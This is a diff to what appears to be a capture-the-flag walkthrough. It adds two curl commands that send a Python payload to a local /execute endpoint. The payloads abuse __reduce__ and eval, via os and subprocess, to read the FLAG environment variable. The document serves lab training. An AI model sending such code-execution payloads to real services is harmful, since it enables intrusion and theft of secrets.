@@ -128,6 +128,10 @@ curl -X POST http://localhost/execute --data-binary 'print("Hello"); 42'
 ```
 
 ### 3. Exploit the vulnerability
+
+The working exploits (both capture the FLAG value):
+
+**Multi-line class definition:**
 ```bash
 curl -X POST http://localhost/execute --data-binary @- <<'EOF'
 class FlagExploit:
@@ -136,6 +140,13 @@ class FlagExploit:
         return (eval, ("__import__('os').environ.get('FLAG', 'No flag')",))
 
 FlagExploit()
+EOF
+```
+
+**One-liner alternative:**
+```bash
+curl -X POST http://localhost/execute --data-binary @- <<'EOF'
+type('E', (), {'__reduce__': lambda s: (eval, ("__import__('subprocess').check_output(['sh', '-c', 'echo -n $FLAG']).decode()",))})()
 EOF
 ```
 
